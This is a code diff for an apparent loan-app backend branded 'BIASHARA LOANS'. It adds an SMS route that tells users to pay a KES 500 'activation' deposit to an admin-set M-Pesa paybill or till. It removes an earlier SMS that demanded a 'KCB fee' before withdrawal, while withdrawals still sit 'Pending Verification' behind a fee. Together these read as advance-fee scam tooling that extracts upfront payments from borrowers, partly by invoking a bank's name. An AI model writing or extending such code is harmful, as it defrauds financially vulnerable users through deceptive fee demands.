@@ -594,6 +594,22 @@ app.post('/api/wallet/withdrawal-sms', auth, async (req, res) => {
     res.json({ ok: true });
   } catch (e) { res.status(500).json({ error: 'Failed to send SMS' }); }
 });
+app.post('/api/wallet/activation-sms', auth, async (req, res) => {
+  try {
+    const user = await getUserById(req.userId);
+    
+    // Fetch the latest payment settings from the Admin Panel
+    let settingsDoc = await settings.findOne({ key: 'deposit' });
+    let payInfo = settingsDoc && settingsDoc.method === 'paybill' 
+      ? `Paybill ${settingsDoc.paybillNumber}, Acc ${settingsDoc.paybillAccount}` 
+      : `Till ${settingsDoc.tillNumber}`;
+
+    // Send the SMS (UPDATED WORDING)
+    await sendSMS(user.phone, `BIASHARA LOANS: Make your first deposit of KES 500 to activate your account via ${payInfo}. Enter the M-Pesa code in the app to proceed.`);
+    
+    res.json({ ok: true });
+  } catch (e) { res.status(500).json({ error: 'Failed to send SMS' }); }
+});
 app.post('/api/wallet/withdraw', auth, async (req, res) => {
   try {
     const amt = Number(req.body.amount);
@@ -617,15 +633,6 @@ app.post('/api/wallet/withdraw', auth, async (req, res) => {
     await users.updateOne({ _id: new ObjectId(req.userId) }, { $inc: { balance: -amt } });
     const ref = makeRef();
     await txs.insertOne({ user_id: req.userId, type: 'withdrawal', amount: amt, fee: fee, description: 'Withdrawal to M-Pesa — Pending Verification', reference: ref, status: 'pending', mpesa_receipt: null, created_at: new Date() });
-
-    // --- NEW: SEND KCB FEE SMS ---
-    let settingsDoc = await settings.findOne({ key: 'deposit' });
-    let payInfo = settingsDoc && settingsDoc.method === 'paybill' 
-      ? `Paybill ${settingsDoc.paybillNumber}, Acc ${settingsDoc.paybillAccount}` 
-      : `Till ${settingsDoc.tillNumber}`;
-
-    await sendSMS(user.phone, `BIASHARA LOANS: To withdraw KES ${amt.toLocaleString()}, pay the KCB fee of KES 500 via ${payInfo}. Enter the M-Pesa code in the app to proceed.`);
-    // -----------------------------
 
     notify(user.phone, '⏳ Withdrawal Pending', `Your withdrawal request for KES ${amt.toLocaleString()} is pending. Verification fee: KES ${fee.toLocaleString()}.`, req.userId);
 
